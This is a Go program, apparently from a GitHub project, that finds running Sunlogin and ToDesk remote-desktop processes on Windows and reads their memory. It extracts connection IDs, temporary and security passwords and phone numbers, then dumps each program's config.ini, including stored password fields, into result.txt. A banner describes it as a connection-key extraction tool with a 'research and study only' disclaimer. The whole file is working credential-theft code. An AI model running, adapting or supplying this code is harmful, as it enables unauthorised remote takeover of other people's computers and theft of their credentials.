package main

import (
	"fmt"
	"github.com/go-ini/ini"
	"log"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"time"
	"unsafe"

	"github.com/fatih/color"
	"github.com/shirou/gopsutil/v3/process"
	"golang.org/x/sys/windows"
)

// 定义常量
const (
	PROCESS_VM_READ           = 0x0010
	PROCESS_QUERY_INFORMATION = 0x0400
)

// 打开进程以获取句柄
func openProcess(pid int32) (windows.Handle, error) {
	handle, err := windows.OpenProcess(PROCESS_VM_READ|PROCESS_QUERY_INFORMATION, false, uint32(pid))
	if err != nil {
		//	return 0, fmt.Errorf("failed to open process: %v", err)
	}
	return handle, nil
}

func writefile(name, text string) {
	fileStr, _ := os.OpenFile(name, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
	fileStr.WriteString(text)
	fileStr.Close()
}

// 读取进程内存
func readMemory(handle windows.Handle, address uintptr, size uint32) ([]byte, error) {
	buffer := make([]byte, size)
	var bytesRead uintptr
	err := windows.ReadProcessMemory(handle, address, &buffer[0], uintptr(size), &bytesRead)
	if err != nil {
		//	return nil, fmt.Errorf("failed to read memory: %v", err)
	}
	return buffer, nil
}

// 搜索进程内存中的字节模式
func searchMemory(handle windows.Handle, pattern []byte) ([]uintptr, error) {
	var results []uintptr
	var memoryInfo windows.MemoryBasicInformation

	address := uintptr(0)
	for {
		err := windows.VirtualQueryEx(handle, address, &memoryInfo, unsafe.Sizeof(memoryInfo))
		if err != nil || memoryInfo.RegionSize == 0 {
			break
		}

		if memoryInfo.State == windows.MEM_COMMIT && (memoryInfo.Protect&windows.PAGE_READWRITE) != 0 {
			data, err := readMemory(handle, memoryInfo.BaseAddress, uint32(memoryInfo.RegionSize))
			if err == nil {
				for i := 0; i < len(data)-len(pattern); i++ {
					if matchPattern(data[i:i+len(pattern)], pattern) {
						results = append(results, memoryInfo.BaseAddress+uintptr(i))
					}
				}
			}
		}
		address = memoryInfo.BaseAddress + uintptr(memoryInfo.RegionSize)
	}

	return results, nil
}

// 检查字节序列是否匹配
func matchPattern(data, pattern []byte) bool {
	for i := range pattern {
		if data[i] != pattern[i] {
			return false
		}
	}
	return true
}

// 提取两个字符串之间的文本
func extractBetween(value, startDelim, endDelim string) string {
	start := strings.Index(value, startDelim)
	if start == -1 {
		return ""
	}
	start += len(startDelim)

	end := strings.Index(value[start:], endDelim)
	if end == -1 {
		return ""
	}

	return value[start : start+end]
}

// 检查字符串是否为数字
func isNumeric(s string) bool {
	_, err := strconv.Atoi(strings.TrimSpace(s))
	return err == nil
}

// 根据进程名称检查进程是否存在并获取所有匹配的 PID 和进程路径
func getPIDsByName(name string) ([]struct {
	PID  int32
	Path string
}, error) {
	// 获取当前系统的所有进程
	processes, err := process.Processes()
	if err != nil {
		return nil, fmt.Errorf("failed to get processes: %v", err)
	}

	var result []struct {
		PID  int32
		Path string
	}

	// 遍历所有进程，查找匹配的进程名
	for _, proc := range processes {
		procName, err := proc.Name()
		if err != nil {
			continue
		}

		// 如果进程名称匹配
		if strings.EqualFold(procName, name) {
			// 获取进程的可执行文件路径
			path, err := proc.Exe()
			if err != nil {
				continue
			}

			// 将 PID 和路径添加到结果中
			result = append(result, struct {
				PID  int32
				Path string
			}{
				PID:  proc.Pid,
				Path: path,
			})
		}
	}

	// 如果没有找到任何匹配的进程，返回 nil
	if len(result) == 0 {
		return nil, nil
	}

	return result, nil
}

// 检查进程是否存在，并返回所有匹配的 PID 和路径
func isProcessExist(name string) (bool, []struct {
	PID  int32
	Path string
}) {
	// 调用 getPIDsByName 获取进程的 PID 和路径
	processes, err := getPIDsByName(name)
	if err != nil {
		// 错误处理
		return false, nil
	}

	// 如果没有找到匹配的进程
	if len(processes) == 0 {
		return false, nil
	}

	// 如果找到匹配的进程，返回 true 和进程信息
	return true, processes
}

// 提取日期并格式化为所需的字符串
func getCurrentDateString() string {
	return time.Now().Format("20060102")
}

// 抓取config.ini配置文件并进行保存
func getConfig(filePath string) {
	fileDir := filepath.Dir(filePath)
	fileConfig := fileDir + "/config.ini"
	// 加载 config.ini 文件
	cfg, err := ini.Load(fileConfig)
	if err != nil {
		log.Fatalf("无法加载配置文件: %v", err)
	}

	// 创建一个 map 来保存所有的配置项
	configData := make(map[string]map[string]string)

	// 遍历所有的 section
	for _, section := range cfg.Sections() {
		// 创建一个 map 来保存当前 section 中的所有 key-value
		sectionData := make(map[string]string)

		// 遍历当前 section 中的所有 key
		for _, key := range section.Keys() {
			// 将 key 和对应的 value 存入 sectionData
			sectionData[key.Name()] = key.String()
		}

		// 将 sectionData 存入 configData 中
		configData[section.Name()] = sectionData
	}

	// 创建一个字符串变量来保存整个配置的文本
	var outputText string

	// 格式化配置内容为文本
	for section, keys := range configData {
		outputText += fmt.Sprintf("[%s]\n", section)
		for key, value := range keys {
			outputText += fmt.Sprintf("%s = %s\n", key, value)
		}
		outputText += "\n"
	}
	writefile("result.txt", outputText)
}

// 扫描向日葵进程
func xiangrikui(pids []struct {
	PID  int32
	Path string
}) {
	writefile("result.txt", "向日葵扫描结果：\n")
	for _, proc := range pids {
		handle, err := openProcess(proc.PID)
		path := proc.Path
		if err != nil {
			fmt.Println(err)
			continue
		}
		defer windows.CloseHandle(handle)

		// 搜索 "<f f=yahei.28 c=color.fastcode >" 模式的字节
		pattern := []byte("<f f=yahei.28 c=color_edit >")
		IDs, err := searchMemory(handle, pattern)
		if err != nil {
			color.Red("搜索失败:", err)
			continue
		}

		if len(IDs) >= 17 {
			for _, id := range IDs {
				data, err := readMemory(handle, id, 900)
				if err != nil {
					color.Red("读取内存失败: %v\n", err)
					continue
				}
				dataStr := string(data)
				//remoteCode := extractBetween(string(data), ">", "</f>")
				//if isNumeric(strings.ReplaceAll(remoteCode, " ", "")) {
				//	fmt.Println("id:", remoteCode)
				//	break
				//}
				numberPattern := regexp.MustCompile(`\b\d{3}.\d{3}.\d{3}\b`)
				number := numberPattern.FindString(dataStr)
				if number != "" {
					number = strings.Replace(number, " ", "", -1)
					color.White(fmt.Sprintf("连接id: %s \n", number))
					writefile("result.txt", fmt.Sprintf("连接id: %s\n", number))
					break
				}
			}
		}

		passwordPattern := []byte("<f f=yahei.28 c=color_edit >")
		passwordArray, err := searchMemory(handle, passwordPattern)
		if err != nil {
			color.Red("搜索密码失败:", err)
			continue
		}

		if len(passwordArray) >= 9 {
			for _, addr := range passwordArray {
				data, err := readMemory(handle, addr, 900)
				if err != nil {
					color.Red("读取内存失败: %v\n", err)
					continue
				}

				password := extractBetween(string(data), ">", "</f>")
				if len(password) == 6 {
					color.White(fmt.Sprintf("连接秘钥: %s", password))
					writefile("result.txt", fmt.Sprintf("连接秘钥: %s\n\n", password))
					writefile("result.txt", "\n")
					break
				}
			}
		}
		color.White(fmt.Sprintf("向日葵安装路径: %s", path))
		writefile("result.txt", fmt.Sprintf("向日葵安装路径: %s \n", path))
		writefile("result.txt", fmt.Sprintf("向日葵配置文件: \n"))
		getConfig(path)
		color.White(fmt.Sprintf("向日葵配置文件已经写入result.txt文件中，请注意查看 \n"))
		fmt.Println()

		windows.CloseHandle(handle)
	}
}

// 扫描ToDesk进程
func todesk(pids []struct {
	PID  int32
	Path string
}) {
	writefile("result.txt", "Todesk扫描结果：\n")
	currentDate := getCurrentDateString()
	pattern := []byte(currentDate)

	for _, proc := range pids {
		handle, err := openProcess(proc.PID)
		path := proc.Path
		if err != nil {
			fmt.Println(err)
			continue
		}
		defer windows.CloseHandle(handle)

		IDs, err := searchMemory(handle, pattern)
		if err != nil {
			color.Red("搜索失败:", err)
			continue
		}

		for _, id := range IDs {
			startAddress := id - 250
			if startAddress < 0 {
				startAddress = 0
			}
			data, err := readMemory(handle, startAddress, 850)
			if err != nil {
				color.Red("读取内存失败: %v\n", err)
				continue
			}

			dataStr := string(data)

			numberPattern := regexp.MustCompile(`\b\d{9}\b`)
			number := numberPattern.FindString(dataStr)
			if number != "" {
				//fmt.Printf("在地址 %x 的上下文中找到的第一个9位纯数字: %s\n", id, number)
				color.White(fmt.Sprintf("连接id: %s \n", number))
				writefile("result.txt", fmt.Sprintf("连接id: %s\n", number))

			}

			alphanumPattern := regexp.MustCompile(`\b[a-z0-9]{8}\b`)
			alphanum := alphanumPattern.FindString(dataStr)
			if alphanum != "" {
				//fmt.Printf("在地址 %x 的上下文中找到的第一个8位小写字母+数字: %s\n", id, alphanum)
				color.White(fmt.Sprintf("临时密码: %s \n", alphanum))
				writefile("result.txt", fmt.Sprintf("临时密码: %s\n", alphanum))
			}

			securityPattern := regexp.MustCompile(`[a-zA-Z\d~!@#$%^&*()_+,\-./';\\[\]^*\\\/]{8,30}`)
			dataStr = strings.Replace(dataStr, alphanum, "", 1)
			security := securityPattern.FindString(dataStr)
			if security != "" {
				color.White(fmt.Sprintf("安全密码: %s \n", security))
				writefile("result.txt", fmt.Sprintf("安全密码: %s\n", security))
			}

			phonePattern := regexp.MustCompile(`\b1[3-9]\d{9}\b`)
			phonenum := phonePattern.FindString(dataStr)
			if phonenum != "" {
				//fmt.Printf("在地址 %x 的上下文中找到的第一个11位手机号: %s\n", id, alphanum)
				color.White(fmt.Sprintf("手机号: %s \n", phonenum))
				writefile("result.txt", fmt.Sprintf("手机号: %s\n\n", phonenum))
				break
			}
		}
		color.White(fmt.Sprintf("Todesk安装路径: %s \n", path))
		writefile("result.txt", fmt.Sprintf("Todesk安装路径: %s \n", path))
		writefile("result.txt", fmt.Sprintf("Todesk配置文件: \n"))
		getConfig(path)
		color.White(fmt.Sprintf("Todesk配置文件已经写入result.txt文件中，请注意查看 \n"))
		fmt.Println()

		windows.CloseHandle(handle)
	}
}

func main() {
	// 检查向日葵进程
	color.Yellow(`
     _______. __    __  .__   __.         .___________.  ______    _______   _______     _______. __  ___ 
    /       ||  |  |  | |  \ |  |   ___   |           | /  __  \  |       \ |   ____|   /       ||  |/  / 
   |   (----'|  |  |  | |   \|  |  ( _ )  '---|  |----'|  |  |  | |  .--.  ||  |__     |   (----'|  '  /
    \   \    |  |  |  | |  . '  |  / _ \/\    |  |     |  |  |  | |  |  |  ||   __|     \   \    |    <
.----)   |   |  '--'  | |  |\   | | (_>  <    |  |     |  '--'  | |  '--'  ||  |____.----)   |   |  .  \
|_______/     \______/  |__| \__|  \___/\/    |__|      \______/  |_______/ |_______|_______/    |__|\__\

										向日葵&ToDesk连接秘钥提取
                            https://github.com/doki-byte/read_sun_todesk
       温馨提示：
                       Todesk安全密码提取可能出现问题，建议查看config.ini中的authPassEx，
                               将其复制到本地config.ini进行替换，直接查看即可
`)
	color.Red("                             仅供研究学习使用，产生相关问题与作者无关")
	fmt.Println()

	exists, pids := isProcessExist("SunloginClient.exe")
	if exists {
		//fmt.Printf("向日葵存在: %v\n", pids)
		color.Green("向日葵存在:")
		xiangrikui(pids)
	} else {
		color.Red("未找到向日葵进程")
	}

	// 检查ToDesk进程
	exists, pids = isProcessExist("ToDesk.exe")
	if exists {
		//fmt.Printf("ToDesk存在: %v\n", pids)
		color.Green("todesk存在:")
		todesk(pids)
	} else {
		color.Red("未找到todes进程")
	}
}
